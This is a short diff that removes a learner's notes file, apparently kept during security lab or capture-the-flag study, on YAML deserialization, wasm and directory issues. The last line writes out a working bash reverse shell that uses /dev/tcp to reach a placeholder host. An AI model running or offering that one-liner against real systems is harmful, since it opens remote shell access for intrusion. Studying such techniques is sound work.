@@ -1,4 +1,0 @@
-1. Learned about YAML deserialization
-2. Learned about wasm
-3. Learned about the issues caused when directories are not specified
-4. Learned about creating reverse shell without using nc: [/bin/bash -i >& /dev/tcp/{ip_address}/{port} 0>&1 ]
